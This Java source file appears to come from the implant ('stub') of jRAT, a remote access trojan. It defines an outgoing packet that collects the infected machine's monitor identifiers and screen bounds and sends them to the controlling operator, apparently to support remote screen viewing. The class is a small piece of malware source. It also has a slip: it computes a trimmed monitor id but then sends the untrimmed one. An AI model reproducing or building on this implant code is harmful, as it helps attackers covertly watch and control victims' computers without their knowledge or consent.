package su.jrat.stub.packets.outgoing;

import java.awt.GraphicsDevice;
import java.awt.Rectangle;
import java.io.DataOutputStream;

import su.jrat.common.io.StringWriter;


public class Packet61InitMonitors extends AbstractOutgoingPacket {

	private GraphicsDevice[] graphicsDevices;

	public Packet61InitMonitors(GraphicsDevice[] graphicsDevices) {
		this.graphicsDevices = graphicsDevices;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		dos.writeInt(graphicsDevices.length);

		for (GraphicsDevice device : graphicsDevices) {
			Rectangle bounds = device.getDefaultConfiguration().getBounds();
			String id = device.getIDstring();
			if (id.startsWith("\\")) {
				id = id.substring(1, id.length());
			}
			
			sw.writeLine(device.getIDstring());
			dos.writeInt(bounds.x);
			dos.writeInt(bounds.y);
			dos.writeInt(bounds.width);
			dos.writeInt(bounds.height);
		}
	}

	@Override
	public byte getPacketId() {
		return (byte) 61;
	}

}
